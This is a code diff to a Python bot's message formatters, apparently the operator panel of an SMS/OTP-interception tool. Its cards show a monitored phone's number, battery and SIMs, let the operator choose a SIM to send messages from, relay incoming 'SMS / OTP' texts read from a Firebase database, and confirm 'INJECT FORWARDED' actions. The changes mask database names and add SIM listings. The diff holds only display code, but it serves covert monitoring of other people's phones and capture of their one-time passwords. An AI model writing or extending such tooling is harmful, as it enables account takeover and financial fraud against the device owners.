@@ -231,6 +231,20 @@ def _db_label(device: Device, profile: MonitorProfile | None = None) -> str:
     return url.rstrip("/")
 
 
+def _mask_db_label(device: Device, profile: MonitorProfile | None = None) -> str:
+    """Astik-style masked Firebase label, e.g. boss-***."""
+    url = device.firebase_source_url or (profile.firebase_url if profile else None) or ""
+    if not url:
+        return "—"
+    host = url.rstrip("/").split("//")[-1].split("/")[0]
+    project = host.split(".")[0] if host else ""
+    project = project.removesuffix("-default-rtdb")
+    prefix = project.split("-")[0] if project else "db"
+    if len(prefix) > 5:
+        prefix = prefix[:4]
+    return f"{prefix}-***"
+
+
 def get_battery(device: Device) -> str:
     meta = get_device_meta(device)
     battery = meta.get("battery") or meta.get("battery_level")
@@ -285,24 +299,25 @@ def format_device_found_card(
     monitoring_was_stopped: bool = False,
 ) -> str:
     """Astik /fdy — Device Found & Set card with DB + timing."""
-    device_short = short_device_id(device.name)
     stop_block = ""
     if monitoring_was_stopped:
         stop_block = (
             "\n⚠️ Previous monitoring was AUTO-STOPPED.\n"
             "Use /startmonitor again when ready."
         )
+    sim_block = _sim_lines_block(device, numbered=True)
     timing = f"\n⚡ Found in {found_ms}ms" if found_ms is not None else ""
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "✅ Device Found &amp; Set! &lt;/&gt;\n"
-        f"📱 {device_short}\n"
+        f"📱 {get_model_name(device)}\n"
         f"📞 {_device_phone_display(device)}\n"
         f"🔋 {get_battery(device)}\n"
         f"{format_device_connection_status(device)}\n"
-        f"🗃️ DB: {_db_label(device, profile)}"
+        f"🗄️ DB: {_mask_db_label(device, profile)}"
         f"{stop_block}\n\n"
+        f"{sim_block}\n\n"
         "Select SIM to send FROM:"
         f"{timing}"
         "</pre>"
@@ -423,17 +438,18 @@ def format_outbound_stream_card(
     )
 
 
-def format_firebase_otp_card(sender: str, message: str) -> str:
-    """Bot-only OTP card from Firebase (no inject)."""
-    body = message.replace("<", "").replace(">", "").strip()
-    if len(body) > 800:
-        body = body[:800] + "..."
-    return (
-        "📩 <b>NEW SMS / OTP</b>\n"
-        "<pre>"
-        f"From: {sender}\n"
-        f"{body}"
-        "</pre>"
+def format_firebase_otp_card(
+    sender: str,
+    message: str,
+    queued_ms: int = 3,
+    total_ms: int = 14,
+) -> str:
+    """Astik-style OTP card from Firebase (bot-only display)."""
+    return format_inject_stream_card(
+        sender,
+        message,
+        queued_ms=queued_ms,
+        total_ms=total_ms,
     )
 
 
@@ -449,8 +465,8 @@ def format_inject_stream_card(
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "⚡ INJECT FORWARDED! [STREAM]\n"
-        f"📥 Sender: {sender}\n"
+        "⚡ INJECT FORWARDED! [STREAM] &lt;/&gt;\n"
+        f"📤 Sender: {sender}\n"
         f"🔐 {body}\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
